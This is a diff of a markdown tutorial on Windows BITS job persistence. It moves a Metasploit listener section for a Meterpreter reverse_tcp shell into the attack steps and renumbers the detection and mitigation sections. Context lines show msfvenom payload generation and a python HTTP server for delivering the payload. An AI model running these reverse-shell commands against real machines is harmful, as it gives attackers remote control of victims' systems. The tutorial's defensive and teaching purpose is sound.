@@ -43,6 +43,18 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f e
 cd /tmp
 python3 -m http.server 8080
 ```
+Setting Up a Listener on Kali Linux
+
+To capture the reverse shell, the attacker sets up a Metasploit listener:
+```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.100.10
+set LPORT 4444
+exploit
+```
+When the victim executes the payload, a Meterpreter session is established, giving the attacker control over the compromised system.
 #### Step 2: Creating a Malicious BITS Job
 
 On the compromised Windows machine, the attacker executes PowerShell commands to create a persistent BITS job:
@@ -69,24 +81,10 @@ If the system is restarted, the job will still exist, allowing the payload to be
 
 ---
 
-## 4. Setting Up a Listener on Kali Linux
 
-To capture the reverse shell, the attacker sets up a Metasploit listener:
-```bash
-msfconsole
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.100.10
-set LPORT 4444
-exploit
-```
-When the victim executes the payload, a Meterpreter session is established, giving the attacker control over the compromised system.
+## 4. Detecting and Mitigating BITS Job Abuse
 
----
-
-## 5. Detecting and Mitigating BITS Job Abuse
-
-### 5.1. Detection
+### 4.1. Detection
 
 Administrators can monitor for suspicious BITS jobs by running:
 ```powershell
@@ -94,7 +92,7 @@ Get-BitsTransfer -AllUsers | Select-Object -Property DisplayName, JobState, Owne
 ```
 Additionally, security logs and endpoint detection tools can help identify unexpected BITS activity.
 
-### 5.2. Mitigation
+### 4.2. Mitigation
 
 To remove suspicious BITS jobs, execute:
 ```powershell
@@ -107,6 +105,6 @@ To further secure the system:
 
 ---
 
-## 6. Conclusion
+## 5. Conclusion
 
 BITS Job Persistence is a stealthy technique that attackers can use to maintain access on a Windows system. By leveraging the native BITS service, adversaries can execute payloads, evade detection, and maintain persistence without modifying the registry or creating new scheduled tasks. Understanding this technique is crucial for defenders to detect and mitigate such attacks effectively.
